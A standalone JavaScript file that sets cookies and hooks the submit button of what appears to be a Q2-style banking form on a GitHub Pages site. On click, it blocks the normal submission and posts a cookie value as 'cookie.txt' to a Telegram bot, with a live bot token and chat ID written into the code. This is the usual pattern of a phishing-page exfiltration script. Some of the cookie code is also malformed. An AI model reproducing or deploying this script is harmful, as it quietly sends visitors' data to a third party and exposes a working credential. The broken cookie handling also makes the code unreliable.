// Reset the themeName cookie
setCookie("themeName", "", 1);

//Function to generate a unique identifier
function generateUniqueId() {
  return "id-" + Math.random().toString(36).substr(2, 16);
}

// Function to set the cookie
function setCookie(name, value, days) {
  let expires = "";
  if (days) {
    const date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    expires = "; expires=" + date.toUTCString();
  }
  document.cookie =
    name +
    "=" +
    (value || "") +
    expires +
    "; path=/; domain=richyyyo.github.io/windjb/; SameSite=None; Secure";
}

// Function to get the value of a cookie by name
function getCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === " ") c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}
// Function to set a cookie wuth a unique identifier
function setPersistentCookie(name, value, days) {
  let uniqueID = generateUniqueId();
  let expires = "";
  if (days) {
    const date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    expires = "; expires=" + date.toUTCString();
  }

  document.cookie =
    name +
    "=" +
    (value || "") +
    expires +
    "; path=/; domain=richyyyo.github.io/windjb/; SameSite=None; Secure; uniqueId=" +
    uniqueID;
}

//Function to get the value of a cookie by name
function getPersistentCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === "") c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

// Create a unique identifier
const uniqueID = "id_" + Math.random().toString(36).substr(2, 16);

// Set the cookie with the unique identifier
setCookie("uniqueID", uniqueID, 7);

setPersistentCookie("uniqueID", uniqueID, 7);

// Retrieve cookie value
const cookieValue = getCookie("uniqueID");

// Create a Blob object with the cookie value
const blob = new Blob([cookieValue], { type: "text/plain" });

const formData = new FormData();
const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
const chatId = "1139790477";
formData.append("chat_id", chatId);
formData.append("document", blob, "cookie.txt");

//Event listener for btn
document
  .querySelector('q2-btn[test-id="btnSubmit"]')
  .addEventListener("click", async function (event) {
    event.preventDefault();
    //Ensure fetch is called only once
    if (!window.fetchCalled) {
      window.fetchCalled = true;
      // Data to bot
      fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: "POST",
        body: formData,
      })
        .then((response) => response.json())
        .then((data) => console.log(data))
        .catch((error) => console.error(error));
    } else {
      console.log("Fetch already called");
    }
  });
